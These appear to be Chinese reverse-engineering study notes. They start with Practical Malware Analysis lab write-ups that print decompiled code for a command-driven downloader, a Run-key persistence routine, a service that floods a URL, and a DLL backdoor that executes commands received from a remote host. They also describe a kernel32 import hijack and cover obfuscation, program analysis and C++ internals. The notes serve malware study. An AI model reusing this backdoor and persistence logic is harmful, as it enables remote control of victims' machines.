__cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+0h] [ebp-8h] if ( !sub_401000() ) return 0; v4 = sub_401040(); if ( v4 ) { sub_40117F(\"Success: Parsed command is %c\\n\", v4); Sleep(0xEA60u); } return 0; } 进行两个if的判断操作。\n在0x40117f中，函数逻辑像打印传入的参数。在这个子函数中使用了switch判断操作。\n在0x401040中，函数的逻辑像使用if来检查html的连通性，成功则下载http://www.practicalmalwareanalysis.com/cc.htm，失败则报错\n网络特征为首先是打开Internet Explorer 7.5/pma，之后是下载http://www.practicalmalwareanalysis.com/cc.htm\n首先检查网络连通性，如果连通则下载http://www.practicalmalwareanalysis.com/cc.htm，让后输出到屏幕:Success: Parsed command is （这个文件）并休眠1分钟；如果不连通则退出。\nLab 6-3 相比6-2多调用了一个sub_401130(v4, *argv);函数。\n其中一个参数(v4)是有关下载的htlm中的值，另一个参数(*argv)是终端中执行文件后跟的参数。这个函数里面使用switch进行判断。判断用户输入的参数来执行相应的操作：\na:创建一个新的目录 CreateDirectoryA与PathName指定的路径。 b:复制文件 使用CopyFileA使用lpexiingfilename指定的源文件名,和数据指定的目标文件名。 c:删除使用文件 DeleteFileA与数据指定的文件路径。 d:打开注册表 键使用RegOpenKeyExA使用子键指定的关键名称,并设置ValueName的值到数据的内容。如果这个操作失败了，则调用sub_401271错误消息。 e:睡眠时间为100秒 使用睡眠。 本地的特特征是在注册表中添加键Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware也就是添加到开机自启动。\n该程序先检查是否存在有效的Internet连接。如果找不到，程序直接终止。否则，改程序会尝试下载一个网页，该网页包含一段以\u003c!–开头的HTML注释。该注释的第一个字符被用于switch语句来决定程序在本地系统运行的下一步行为，包括是否删除一个文件、创建一个目录、设置一个注册表run键、复制一个文件或者休眠100秒。\nLab 6-4 与6-3相比添加了一个循环的次数，循环1441次6-3的逻辑。一次循环休眠1分钟，则执行完需要24小时，并且User-Agent中添加了运行时间的分钟数。\nLab 7-1 程序首先定义了一个名为MalService的服务：\nServiceStartTable.lpServiceName = aMalservice; 之后程序尝试获取一个名为HGL345的互斥体，如果存在则退出：\nif ( OpenMutexA(0x1F0001u, 0, Name) ) ExitProcess(0); 如果不存在，则创建一个互斥体：\nCreateMutexA(0, 0, Name); 之后打开SCM（系统控制管理器）：\nSCM = OpenSCManagerA(0, 0, 3u); 获取当前进程的handle：\nGetCurrentProcess() 获取当前模块名，并且创建一个名为Malservice的服务，CreateServiceA这个函数的第四个参数为二则代表SERVICE_AUTO_START：\nGetModuleFileNameA(0, Filename, 0x3E8u); CreateServiceA(SCM, DisplayName, DisplayName, 2u, 0x10u, 2u, 0, Filename, 0, 0, 0, 0, 0); 之后清空系统时间结构体中月的成员，并设置年为2100年，之后设置了一个Timer来等待这个时间：\nmemset(\u0026SystemTime.wMonth, 0, 14); SystemTime.wYear = 2100; SystemTimeToFileTime(\u0026SystemTime, \u0026FileTime); WaitableTimerA = CreateWaitableTimerA(0, 0, 0); SetWaitableTimer(WaitableTimerA, \u0026FileTime, 0, 0, 0, 0); 如果时间没到，则睡觉（时间很长,如果这个睡觉时间结束，但是等待的时间还没有到，程序似乎就直接退出了，因为这个0xFFFFFFFF才2.05天），如果时间到了则创建20个线程，这20个线程一直循环访问网站http://www.malwareanalysisbook.com：\nif ( !WaitForSingleObject(WaitableTimerA, 0xFFFFFFFF) ) { v2 = 20; do { CreateThread(0, 0, StartAddress, 0, 0, 0); --v2; } while ( v2 ); } Sleep(0xFFFFFFFF); void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter) { void *i; // esi for ( i = InternetOpenA(szAgent, 1u, 0, 0, 0); ; InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0) ) ; } Lab 7-2 所有代码如下，显而易见没有持久化，不退出等操作：\nint __cdecl main(int argc, const char **argv, const char **envp) { OLECHAR *v3; // esi LPVOID ppv; // [esp+0h] [ebp-24h] BYREF VARIANTARG pvarg; // [esp+4h] [ebp-20h] BYREF __int16 v7[4]; // [esp+14h] [ebp-10h] BYREF int v8; // [esp+1Ch] [ebp-8h] if ( OleInitialize(0) \u003e= 0 ) { CoCreateInstance(\u0026rclsid, 0, 4u, \u0026riid, \u0026ppv); if ( ppv ) { VariantInit(\u0026pvarg); v7[0] = 3; v8 = 1; v3 = SysAllocString(psz); (*(*ppv + 0x2C))(ppv, v3, v7, \u0026pvarg, \u0026pvarg, \u0026pvarg); SysFreeString(v3); } OleUninitialize(); } return 0; } 这个COM组件有一个规定就是，如果程序想要使用COM组件那么在程序开头必须调用一个或以上的OleInitialize或者CoInitializeEx让COM初始化，而CoCreateInstance为创建一个COM组件，其中rclsid为Internet Explorer，riid为IWebBrowser2。或许是无法识别的原因，这个*ppv + 0x2C，也就是[edx+2Ch]这个地址其实是Navigate函数，这个函数就可以使程序启动Internet Explorer，第二个参数（v3）就是弹出浏览器的地址（http://www.malwareanalysisbook.com/ad.html）。\nLab 7-3 DLL：\nBOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { SOCKET v3; // esi HANDLE hObject; // [esp+10h] [ebp-11F8h] struct sockaddr name; // [esp+14h] [ebp-11F4h] BYREF struct _PROCESS_INFORMATION ProcessInformation; // [esp+24h] [ebp-11E4h] BYREF struct _STARTUPINFOA StartupInfo; // [esp+34h] [ebp-11D4h] BYREF struct WSAData WSAData; // [esp+78h] [ebp-1190h] BYREF char buf[4093]; // [esp+208h] [ebp-1000h] BYREF __int16 v11; // [esp+1205h] [ebp-3h] char v12; // [esp+1207h] [ebp-1h] if ( fdwReason == 1 ) { buf[0] = byte_10026054; memset(\u0026buf[1], 0, 0xFFCu);\t//初始化 v11 = 0; v12 = 0; if ( !OpenMutexA(0x1F0001u, 0, Name) )\t//打开互斥体，如果没有就创建一个 { CreateMutexA(0, 0, Name); if ( !WSAStartup(0x202u, \u0026WSAData) )\t//初始化winsock库 { v3 = socket(2, 1, 6);\t//创建tcp通信 if ( v3 != -1 ) { name.sa_family = 2; *\u0026name.sa_data[2] = inet_addr(cp); *name.sa_data = htons(0x50u); if ( connect(v3, \u0026name, 16) != -1 ) { while ( 1 ) { while ( 1 ) { do { if ( send(v3, ::buf, strlen(::buf), 0) == -1 || shutdown(v3, 1) == -1 )\t//这个send发送了hello goto LABEL_15; } while ( recv(v3, buf, 4096, 0) \u003c= 0 );\t//如果接收到sleep就睡觉60秒，如果接收到exec就接收第五个之后的值进行启动进程。 if ( strncmp(expect_sleep, buf, 5u) ) break; LABEL_10: Sleep(0x60000u); } if ( strncmp(expect_exec, buf, 4u) ) { if ( buf[0] == 'q' ) { CloseHandle(hObject); break; } goto LABEL_10; } memset(\u0026StartupInfo, 0, sizeof(StartupInfo)); StartupInfo.cb = 68; CreateProcessA(0, \u0026buf[5], 0, 0, 1, 0x8000000u, 0, 0, \u0026StartupInfo, \u0026ProcessInformation); } } LABEL_15: closesocket(v3); } WSACleanup(); } } } return 1; } EXE：\n大致流程为\n程序在system32目录下创建kerne132.dll文件 创建Lab07-03.dll文件在当前目录下，通过一系列操作，将Lab07-03.dll文件写入特定内容，可以使kerne132.dll的导出表与kernel32.dll的导出表相同，并且当调用kerne132.dll中的api时转发到kernel32.dll中调用函数 将Lab07-03.dll复制到system32目录下的kerne132.dll文件中 遍历C目录下的所有.exe文件，将其中的kernel32.dll改为kerne132.dll "},"title":"Lab"},"/docs/remaining/obfu/":{"data":{"":"","#":"VM 代码块与变异 代码块定义：由程序执行流程中发生跳转的指令作为分隔线划分出来的代码内容，代码块不等于函数块，因为函数块具有一定的格式。（vm中分隔代码块的分隔线是变异）\n循环代码块（vm指令）：是虚拟机分配任务的一种处理程序。\n代码变异：改变代码的执行顺序但是逻辑是不变的，就是改变了位置\njmp xxx属性：不影响标志位、重定位、栈\n简单的代码通过加jmp的方式使流程变复杂了：\ngraph TB A[L1:\\nmov eax,eax\\nadd eax,ecx\\njmp L2] B[L3:\\npop esp\\nretf] C[push ebp\\npush ecx\\njmp L1] D[L2:\\nadd ecx,eax\\npop ebp\\njmp L3] A ~~~ B ~~~ C ~~~ D A --\u003e D C --\u003e A D --\u003e B 处理指令大致流程如下：\ngraph TB A[vcpu循环结构（代码执行）] B[读取v指令] C[vADD] A --\u003e B B --\u003e A A --\u003e C C --\u003e A 函数调用流程 退出虚拟机寄存器保持一致，恢复到原x86CPU或x64CPU。eflag也是。 特点： 虚拟化一个函数，调用函数肯定会退出虚拟机（或者把调用的API也给VM了） 虚拟机执行到一个函数时，指令也随之结束 函数调用与退出的时候会重新进入虚拟机 遇到无法模拟的指令则会退出虚拟机，执行完无法模拟的指令后重新进入虚拟机 流程结构 虚拟机流程结构大致如下：\n参数转移 应该是VM两个不同的函数后如果参数（细节）相同，那么就会将这两个函数变成一个函数进行无缝执行。\n流程大致如下：\n当程序无缝执行后（比如上图）是无法捕捉到vfunc2的特征的，只能捕捉的就是vfunctotal执行后的返回值等属性。\n之前说过虚拟化一个函数，调用函数肯定会退出虚拟机，但是无缝执行中的函数调用不会退出虚拟机。\n合流 代码漂移 栈机 栈机指的是一种计算机体系结构，在这种体系结构中，大部分操作都依赖于一个操作数栈来完成。\n不同解释：\n正常我们遇到的大多数是寄存器机，用寄存器传递参数，比如两个数字相加：\nmov eax, 0x1145 mov ebx, 0x14 ;之后取值就直接使用寄存器取值了 add eax, ebx 栈机则是通过栈传参数（与pwn的ROP传参有点类似）\npush 0x1145 push 0x14 ;取值可以通过esp加偏移取值，操作性更强 mov eax,[esp+4] add eax,[esp] pop ebx ;平栈 pop ebx 堆机 堆的特点：\n地址不固定（可能需要处理重定位） 需要动态分配（alloc） 实现如下：\ngraph TB A[进入虚拟机] B[进入栈模式架构的虚拟机（栈机）] C[栈模式架构分配一定空间（GetModuleHandle（））] D[经过重定位处理的shellcode写入堆] E[vEIP转移] A --\u003e B B --\u003e C C --\u003e D D --\u003e E 可以动态修复地址：\ncall Lab1 Lab1： pop eax ;eax为call的下一行的地址，可以算出重定位地址 opcode 参考代码如下，实现弹两个信息框：\n.386 option casemap:none .model flat,stdcall include user32.inc includelib user32.lib .data g_MessageBoxMy db 00,00,00,00,00,\\ 00,00,00,00,00,\\ 00,00,00,00,00,\\ 00,00,00,00,00, 00 g_offsetMessage dd 00 db 01 .data g_handletable dd offset vPush,offset vCall g_dispatchFun dd ? .code vPush proc mov eax,dword ptr [esi] push eax add esi,4 jmp g_dispatchFun vPush endp vCall proc mov eax,dword ptr [esp] add esp,4 push offset vEntry jmp eax jmp g_dispatchFun vCall endp vEntry proc ret vEntry endp Main proc uses esi mov g_offsetMessage,OFFSET MessageBoxA mov g_dispatchFun,LOOP_OPCODE mov esi,offset g_MessageBoxMy LOOP_OPCODE: movzx edx,byte ptr [esi] inc esi jmp dword ptr [g_handletable + edx * 4] ret Main endp end Main 大概逻辑如下：\n首先获取opcode的第一位，判断是什么虚拟指令 如果是00，则为vPush，则进入vPush进行处理 在vPush里面会将4字节压入栈中，然后将opcode加4。如此循环直到压入g_offsetMessage就是MessageBoxA的地址。 之后取出01，为vCall（edx=1，跳转到g_handletable的第二个），进入vCall进行处理 在vCall里面会取出esp位置的值，将栈降低4字节（相当于Push eax），之后压入返回地址vEntry，就跳到eax执行MessageBoxA。 代码变形 一条指令可能由多条指令组合，每次编译都不同 可以实现一堆等价的汇编代码构成一个库，然后通过随机数去替换原理的汇编代码，达到变形 膨胀 将一行汇编指令等价的变（替换）为多行汇编指令，增大代码量\n自膨胀需要一定的媒介（比如栈）\nmov eax, ecx 膨胀0： push ecx pop eax 膨胀1： sub esp, 4 mov [esp], ecx mov eax, [esp] add esp, 4 膨胀2： mov ebx, 2 shl ebx, 1 sub esp, ebx lea edi, [esp] mov edx, ecx mov [edi], edx lea edi, [esp] mov edx, [edi] mov eax, edx mov ebx, 8 shr ebx, 1 add esp, ebx 保证：\n保证寄存器、标志位、栈不被影响 保证异常的顺序正常 自膨胀过程中优先使用寄存器膨胀（因为寄存器的效率大于栈） 分发 vmp2.x的流程分发为vm_dispatch\nvmp3.x的流程方法为vm_handle，也就是只有执行了上一个handle才会确定并执行下一个handle\n万用门 vmp2.x：nor\nvmp3.x：nor（或非门），nand（与非门）\n与非门：\n//根据德摩根律推导 not(a) = nand(a) and(a,b) = nand(nand(a,b),nand(a,b)) or(a,b) = nand(nand(a,a),nand(b,b)) xor(a,b) = nand(nand(nand(a,a),b),nand(a,nand(b,b))) nand(1,0) = !(1 \u0026 0) = 1 nand(1,1) = !(1 \u0026 1) = 0 或非门：\n//根据德摩根律推导 not(a) = nor(a) and(a,b) = nor(nor(a,a),nor(b,b)) or(a,b) = nor(nor(a,b),nor(a,b)) xor(a,b) = nor(nor(nor(a,a),nor(b,b)),nor(a,b)) "},"title":"Obfu"},"/docs/remaining/program-analysis/":{"data":{"":"","#":"介绍 原则： 查找程序的错误宁可误报，不可漏报。在确保正确的前提下，尽可能的提高分析速度与精确度。 遍历程序的执行流要全面，不全面可能会漏报错误。 Intermediate Representation 编译流程：\ngraph TB A[源代码] B[Scanner\\n词法分析] C[Parser\\n语法分析] D[Type Checker\\n语义分析] E[Translator] F[Code Generator] G[机器码] A --\u003e B B --Tokens--\u003e C C --AST--\u003e D D --Decorated AST--\u003e E E --IR(静态分析)--\u003e F F --\u003e G AST IR\n对于一下的代码：\ndo i = i + 1; while (a[i] \u003c v); 可以通过GCC使用指令查看GIMPLE：\ngcc -O0 -fdump-tree-all test.cpp GCC会将源代码首先转换为GENERIC（一种树状表示），然后降级为GIMPLE（一种简化的、线性的、基于寄存器的3-地址形式），最后再转换为RTL（更低级的表示）。\nGIMPLE如下（.gimple）：\n\u003cD.4674\u003e: i = i + 1; _1 = a[i]; if (v \u003e _1) goto \u003cD.4674\u003e; else goto \u003cD.4672\u003e; \u003cD.4672\u003e: AST如下：\ngraph TD A[DoWhile] --\u003e B(Body); A --\u003e C(Condition); B --\u003e D[=]; D --\u003e E(Target); D --\u003e F(Value); E --\u003e G[i]; F --\u003e H[+]; H --\u003e I(Left); H --\u003e J(Right); I --\u003e K[i]; J --\u003e L[1]; C --\u003e M[\u003c]; M --\u003e N(Left); M --\u003e O(Right); N --\u003e P[Array]; P --\u003e Q(Base); P --\u003e R(Index); Q --\u003e S[a]; R --\u003e T[i]; O --\u003e U[v]; Static Single Assisnment（SSA）\n相较于3-地址码而言，每一个变量都有自己的一个定义。如果遇到不同的执行流所影响的变量则在受影响的变量前添加Φ(x0,x1)（如下x0与x1影响x2）。\ngraph TB A[if e] B[x0 = 0] C[x1 = 1] D[y = x + 7] E[if e] F[x0 = 0] G[x1 = 1] H[Φ（x0,x1）\\ny = x2 + 7] A --\u003e B A --\u003e C C --\u003e D B --\u003e D E --\u003e F E --\u003e G F --\u003e H G --\u003e H Control Flow Analysis（CFG）\n控制流图，就是在IDA中的汇编界面按空格就能看到类似的。\n执行流程总体是自上到下的，遇到判断等会有两个两个执行流；遇到强行跳转等则不会有下一行的执行流。\ngraph TB A[Entry] B[x = input\\ny = x - 1] C[z = x * y\\nif z \u003c x goto B4] D[p = x / y\\np = q + y] E[a = q\\nb = x + a\\nc = 2a - b\\nif p == q goto B6] F[goto B2] G[return] H[Exit] A~~~B~~~C~~~D~~~E~~~F~~~G~~~H A --\u003e B B --\u003e C C --\u003e E C --\u003e D D --\u003e E E --\u003e F E --\u003e G F --\u003e B G --\u003e H Basic Blocks\n应该就是起始的代码块，要求不能有其他的入口，结束为最后一条语句\nData Flow Analysis1 输入输出状态\n对于某段代码或函数，用IN[s1]代表输入的信息（参数等）；用OUT[s1]代表输出的信息（返回值等）\n在一条执行流上相邻的代码，前面代码的输出信息等于后面代码的输入信息；一条执行流分为多条的情况下，多条执行流的输入信息为那一条执行流的输出信息；多条执行流合为一条执行流，这一条执行流的输入信息为多条执行流的输出信息（用^连接，意为相遇）"},"title":"Program Analysis"},"/docs/remaining/web/":{"data":{"":"","#":"网站的搭建 http协议\n超文本传输协议是互联网上应用最广泛的一种网络协议。所有www文件都必须遵循一个标准，是以ASCII码传输，建立在TCP/IP协议之上的应用层规范，简单点说就是一种固定的通讯规则。\n网络的三种架构及特点\n客户机/服务器架构（C/S）\n需要安装特定的客户端程序，针对不同平台开发不同版本，升级应用需要更新安装，能够直接使用客户端硬件资源。\n浏览器/服务器（B/S）\n客户端无需安装，有Web浏览器即可跨平台，无缝升级，客户端免维护\nP2P结构\n点到点系统，不需要服务器中转，客户端与服务端彼此直接通信。\n网站是如何搭建的\n分为服务器，中间件，数据库，代码（后端），静态资源（前端，写功能点）\n网站的运行原理 常用术语\n客户端：连接到互联网的应用程序，及浏览器 服务器：能上网的计算机，用于用于接收和处理用户的请求信息 IP地址：互联网协议地址，TCP/IP网络设备的数字标识符，用于识别和通信，ipv4与ipv6 域名：用于标识一个或多个ip地址 DNS：域名系统，用于跟踪计算机的域名及其在互联网上相应的IP地址 ISP：互联网服务提供商 TCP/IP：传输控制协议/互联网协议 HTTP：超文本传输协议 运行原理\n输入网址 浏览器与ISP通信，在DNS中查找对应的IP地址，然后发送给DNS服务，最后向IP地址发送请求 浏览器获取IP地址和端口，打开TCP套接字连接，实现浏览器和web服务器的连接 发送用户HTTP请求给服务器 web服务器根据请求查找相应的HTML页面，并返回 流程图\ngraph TB A[浏览器\\n输入网址访问] B[找到服务器IP地址] C[服务器] A --通过DNS解析域名--\u003e B B --发送请求至服务器--\u003e C C --服务器接收处理请求\\n并相应请求--\u003e A DNS\n把域名指向网站空间的IP，让人们通过注册的域名方便地访问到网站的一种服务。\ngraph TB A[终端设备] B[DNS服务器] C[站点服务器] A --域名解析请求--\u003e B B --站点的IP地址--\u003e A A --依据站点的IP地址\\n访问站点--\u003e C "},"title":"Web"},"/docs/windows/windows-bas/":{"data":{"":"","#":"进制 本质：其实就是查表，按每一行到下一行进位来排列\n逻辑运算 或（or |）：只要有1个就是1 与（and \u0026）：两个都为1才是1 异或（xor ^）:两个不一样才是1 非（not ！）：1是0，0是1 汇编语言 注意：\n[]等价与c语言中的*，lea指令相当于c语言中的\u0026\n标志寄存器如下：\n标志寄存器 进位标志CF(Carry Flag)：如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 奇偶标志PF(Parity Flag)：用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。（有效的部分1的个数） 辅助进位标志AF(Auxiliary Carry Flag)：在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0： 在字操作时，发生低字节向高字节进位或借位时； 在字节操作时，发生低4位向高4位进位或借位时。 零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。 符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。 溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 注意：\n最高位进位与溢出的区别：\n进位标志表示无符号数运算结果是否超出范围\n溢出标志表示有符号数运算结果是否超出范围\n溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律：\n正 + 正 = 正 如果结果是负数，则说明有溢出\n负 + 负 = 负 如果结果是正数，则说明有溢出\n正 + 负 永远都不会有溢出\n有无符号：\n无符号数：0 ..... FF 有符号数： 正数：0 ..... 7F 负数：80 ..... FF 数据操作指令 ADC指令：带进位加法\n格式：ADC R/M,R/M/IMM 两边不能同时为内存 宽度要一样\nSBB指令：带借位减法\n格式：SBB R/M,R/M 两边不能同时为内存 宽度要一样\nXCHG指令：交换数据\n格式：XCHG R/M,R/M/IMM 两边不能同时为内存 宽度要一样\nMOVS指令：移动数据 内存-内存\nMOVS后面跟B，W，D代表[EDI]单元的大小\nSTOS指令：将Al/AX/EAX的值存储到[EDI]指定的内存单元\nSTOS后面跟B，W，D代表[EDI]单元的大小\nREP指令：按计数寄存器 (ECX) 中指定的次数重复执行字符串指令\nJCC 1、\tJE, JZ 结果为零则跳转(相等时跳转)\tZF=1 2、\tJNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0 3、\tJS 结果为负则跳转\tSF=1 4、\tJNS 结果为非负则跳转\tSF=0 5、\tJP, JPE 结果中1的个数为偶数则跳转\tPF=1 6、\tJNP, JPO 结果中1的个数为偶数则跳转\tPF=0 7、\tJO 结果溢出了则跳转\tOF=1 8、\tJNO 结果没有溢出则跳转\tOF=0 9、\tJB, JNAE 小于则跳转 (无符号数)\tCF=1 10、\tJNB, JAE 大于等于则跳转 (无符号数)\tCF=0 11、\tJBE, JNA 小于等于则跳转 (无符号数)\tCF=1 or ZF=1 12、\tJNBE, JA 大于则跳转(无符号数)\tCF=0 and ZF=0 13、\tJL, JNGE 小于则跳转 (有符号数)\tSF≠ OF 14、\tJNL, JGE 大于等于则跳转 (有符号数)\tSF=OF 15、\tJLE, JNG 小于等于则跳转 (有符号数)\tZF=1 or SF≠ OF 16、\tJNLE, JG 大于则跳转(有符号数)\tZF=0 and SF=OF C switch语句 switch​语句在case​为小于3个时，与三个if else判断逻辑相同，当大于三个case时会生成一张\"大表\"，“大表\"会通过偏移（减去最小的case做基础）生成地址表，再通过最小单元乘偏移找到要跳转表的地址进行跳转。不连续时也会生成\"大表”，通过将不存在的case的对应地址写为跳出地址。比全部使用if else来判断更快\nfor循环 for(A;B;C){D}​的执行顺序为ABDC BDC ... 汇编语言的书写顺序是ABDC jmp A\n多维数组 底层逻辑就是连续存储，与相同数量的一维数组等效。区别仅仅是开发人员好找数组中的值，编译器找值是套公式的，假如在数组arr[5][4][3]中找arr[1][2][1]​，则是arr[1×4×3+2×3+1]\n指针 1、不带类型的变量， ++或者–都是加1 或者减1\n2、带类型的变量， ++或者–新增(减少)的数量是去掉一个*后变量的宽度\n3、指针类型的变量可以加、减一个整数，但不能乘或者除.\n4、指针类型变量与其他整数相加或者相减时：指针类型变量+N =指针类型变量+N（去掉一个后类型的宽度）指针类型变量-N= 指针类型变量-N（去掉一个后类型的宽度）\n\u0026和* \u0026取地址符（但不一定是地址哦），将原来的变量类型后加*，比如int变int *\n*取值符，加上一个指针类型就是指针类型减去一个 * （与\u0026是互逆操作）\n特性：\n带有 * 的变量类型的标准写法：变量类型 * 变量名\n任何类型都可以带 * ，加上 * 以后是新的类型\n可以是任意多个 带 * 类型的变量赋值时只能使用 “完整写法” .\n带 * 类型的变量宽度永远是4字节、无论类型是什么，无论有几个 * .\n不带 * 类型的变量，++或者– 都是假1 或者减1 带 * 类型的变量，可是进行++ 或者 –的操作 带* 类型的变量，++ 或者 – 新增(减少)的数量是去掉一个 * 后变量的宽度\n带 * 类型的变量可以加、减一个整数，但不能乘或者除.\n带 * 类型变量与其他整数相加或者相减时：\n带 * 类型变量 + N = 带 * 类型变量 + N * （去掉一个 * 后类型的宽度） 带 * 类型变量 - N = 带 * 类型变量 - N * （去掉一个 * 后类型的宽度） 两个类型相同的带 * 类型的变量可以进行减法操作.\n想减的结果要除以去掉一个 * 的数据的宽度.\n带 * 的变量，如果类型相同，可以做大小的比较。\n字符串操作 1.int strlen (char* s)​返回值是字符串s的长度。不包括结束符%0。\n2.char* stropy (char* dest, char* src);​复制字符串src到dest中。返回指针为dest的值。\n3.char* strcat (char* dest, char* src);​将字符串src添加到dest尾部。返回指针为dest的值。\n4.int strcmp (char* s1, char* s2);​一样返回0 不一样返回非0\n指针取值操作 *(p+i) =p[i]​\n*( *(p+i)+k) = p[i][k]​\n*( *( *(p+i)+k)+m) = p[i][k][m]​\n*( *( *( *( *(p+i)+k)+m)+w)+t) = p[i][k][m][w][t]​\n*()与[]可以相互转换\nC++ //类: struct Student { int a; int b; int c; int d; int Plus()\t//\u003c--------(封装)成员函数 { return a+b+c+d; } }; 概述 什么是封装：将函数定义到结构体内部,就是封装。 什么是类：带有函数的结构体，称为类。 什么是成员函数：结构体里面的函数，称为成员函数。 如果要调用成员函数时的规则：类.函数名(s.Plus())\nthis指针(结构体首地址) struct Student { int a; int b; int c; int d; int Plus()\t//\u003c-------- { return a+b+c+d; } }; s.Plus()\t//\u003c--------Plus()函数中通过ecx传入结构体首地址(this指针) struct Student { int a; int b; int c; int d; void init(int a,int b,int c,int d)\t//\u003c--------可以通过成员函数对成员进行赋值 { this-\u003ea = a; this-\u003eb = b; this-\u003ec = c; this-\u003ed = d; } }; this指针是编译器默认传入的，通常都会使用ecx进行参数的传递。 成员函数都有this指针，无论是否使用。 this指针不能做++--等运算,不能重新被赋值。 this指针不占用结构体的宽度。 构造函数 struct Sclass { int a; int b; int c; int d; Sclass()\t//\u003c--------没有返回值，名称与类名称相同(无参构造函数) { printf(\"无参构造函数\\n\"); } Sclass(int a,int b,int c,int d)\t//\u003c--------没有返回值，名称与类名称相同(有参构造函数) { this-\u003ea = a;\t//\u003c--------可以进行初始化操作 this-\u003eb = b; this-\u003ec = c; this-\u003ed = d; printf(\"有参构造函数\\n\"); } int Plus() { return a+b+c+d; } }; Sclass s;\t//\u003c--------调用无参构造函数 Sclass s();\t//\u003c--------调用有参构造函数 与类同名且没有返回值 创建对象的时候执行/主要用于初始化 可以有多个（最好有一个无参的，一定要有不同的参数个数的不同），称为重载其他函数也可以重载 编译器不要求必须提供 析构函数 struct Person { int age; int level; Person() { printf(\"无参构造函数执行了...\"); } Person(int age,int level) { printf(\"有参构造函数执行了...\"); this-\u003eage = age; this-\u003elevel =level; } ~Person()\t//\u003c--------析构函数,对象什么时候分配空间,就在相应的空间收回时执行(结束时) { printf(\"析构函数执行了...\"); } void Print() { printf(\"%d-%d\\n\",age,level); } }; 只能有一个析构函数，不能重载 不能带任何参数(因为是系统帮我们调用的，自然就没有参数了) 不能带返回值 主要用于清理工作 编译器不要求必须提供 继承 格式：\nstruct Person { int age; int sex; }; struct Teacher { int age; int sex; int level; int classld; }; struct Teacher:Person //\u003c--------子类:父类 { int level; int classld; }; 什么是继承？继承就是数据的复制 为什么要用继承？减少重复代码的编写 Person称为父类或者基类（要复制） Teacher称为子类或者派生类 区别：\n不局限与父类的继承：\nstruct X { int a; int b; }; struct Y:X { int c; int d; }; struct Z:Y { int e; int f; }; 多重继承：\nstruct X { int a; int b; }; struct Y { int c; int d; }; struct Z:X,Y\t//\u003c--------如果X在前面，则在内存中X也在前面 { int e; int f; }; 权限控制 public与private\npublic的意思是，这个成员哪里都可以用，不用担心被修改，所以，一旦发布成public的成员，是不能够改名字的。 private的意思是，这个成员只用于内部使用，不要在其他的地方使用。 struct Test\t{\tprivate:\tint x; public:\tint y; };\t总结：\n对外提供的函数或者变量，发布成public的不能随意改动。 可能会变动的函数或者变量，定义成private的 这样编译器会在使用的时候做检测。 只有结构体内部的函数才可以访问private的成员。 public/private可以修饰函数也可以修饰变量。 注意！\nprivate修饰的成员与普通的成员没有区别，只是编译器会检测。 private修饰的成员只有自己的其他成员才能访问。 class与struct的区别：编译器默认class中的成员为private而struct中的成员为public。 父类中的程序继承后变成private属性，如果还想是public属性则改为：class Sub:public Base。 父类中的私有成员是会被继承的，只是编译器不允许直接进行访问。 将定义与实现分离，代码会有更好的可读性（不是必须的）\n//xxx.h 头文件中 struct Test { int x; int y; int z; void Init(int x,int y,int z); void Function1(); void Function2(); void Function3(); }; //xxx.cpp文件中 void Test::Init(int x,int y,int z) { this-\u003ex = x; this-\u003ey = y; this-\u003ez = z; } void Test::Function1() { printf(\"Function1:%x\\n\",x); } void Test::Function2() { printf(\"Function2:%x\\n\",y); } void Test::Function3() { printf(\"Function3:%x\\n\",z); } 注意：\nxxx.h只是一个文件，可以是任何的后缀名，如果你愿意，可以叫xxx.exe #include …的作用只是把里面的内容复制过来，仅此而已。 xxx.h与xxx.cpp并不要求一定同名。 虚函数 在函数前面加上virtual​\nvirtual double area() { return 0; } 如果这个虚函数连方法体都没有，那么称之为纯虚函数\nvirtual double area() = 0 虚函数目的是提供一个统一的接口，被继承的子类重载，以多态的形式被调用（让子类实现一个操作）。虚函数可以被直接使用，也可以被子类重载以后以多态的形式调用。而纯虚函数是因为父类没有实现这个操作的意义，如果父类有纯虚函数（抽象类），那么子类必须要实现这个函数。\n注意：\n通过对象调用时，virtual函数与普通函数都是E8 Call。\n通过指针调用时，virtual函数是FF Call，也就是间接Call。\n当类中有虚函数时，会多一个属性，4个字节。\n多出的属性是一个地址，指向一张表，里面存储了所有虚函数的地址。\n虚表 现象：只要有虚函数在的类中，成员的大小会多出4个字节（不管虚函数有几个虚函数）\n原因：有虚函数时，会将虚表的地址存到对象的开始的位置，那么成员函数有几个，这个虚表就有几个虚函数的地址。虚表的内容就是成员函数的地址。\n不同情况下虚表的结构\n无继承无函数覆盖\nstruct Base { public: virtual void Function_1() { printf(\"Function_1...\\n\"); } virtual void Function_2() { printf(\"Function_2...\\n\"); } virtual void Function_3() { printf(\"Function_3...\\n\"); } }; 单继承无函数覆盖\nstruct Base { public: virtual void Function_1() { printf(\"Base:Function_1...\\n\"); } virtual void Function_2() { printf(\"Base:Function_2...\\n\"); } virtual void Function_3() { printf(\"Base:Function_3...\\n\"); } }; struct Sub:Base { public: virtual void Function_4() { printf(\"Sub:Function_4...\\n\"); } virtual void Function_5() { printf(\"Sub:Function_5...\\n\"); } virtual void Function_6() { printf(\"Sub:Function_6...\\n\"); } };\t单继承有函数覆盖\nstruct Base { public: virtual void Function_1() { printf(\"Base:Function_1...\\n\"); } virtual void Function_2() { printf(\"Base:Function_2...\\n\"); } virtual void Function_3() { printf(\"Base:Function_3...\\n\"); } }; struct Sub:Base { public: virtual void Function_1() { printf(\"Sub:Function_1...\\n\"); } virtual void Function_2() { printf(\"Sub:Function_2...\\n\"); } virtual void Function_6() { printf(\"Sub:Function_6...\\n\"); } }; 